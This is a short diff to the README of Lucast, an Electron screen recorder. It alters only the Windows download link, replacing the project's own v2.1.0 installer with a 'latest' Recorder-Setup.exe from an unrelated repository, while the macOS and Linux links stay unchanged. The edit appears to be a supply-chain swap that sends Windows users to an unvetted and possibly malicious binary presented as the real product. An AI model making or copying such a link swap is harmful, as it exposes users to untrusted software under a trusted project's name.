@@ -26,7 +26,7 @@
 Lucast is made with Electron, which makes it possible to ship the application to different operating systems.
 Download the latest release in the releases tab or below:
 
--   :window: **Windows** — [**Download**](https://github.com/PAXANDDOS/lucast-electron/releases/download/v2.1.0/Lucast-Setup.exe)
+-   :window: **Windows** — [**Download**](https://github.com/qdani/recorder/releases/latest/download/Recorder-Setup.exe)
 -   :desktop_computer: **macOS** — [**Download**](https://github.com/PAXANDDOS/lucast-electron/releases/download/v2.1.0/Lucast-Installer.dmg)
 -   :penguin: **Linux** — [**Download**](https://github.com/PAXANDDOS/lucast-electron/releases/download/v2.1.0/Lucast-Installer.AppImage)
 
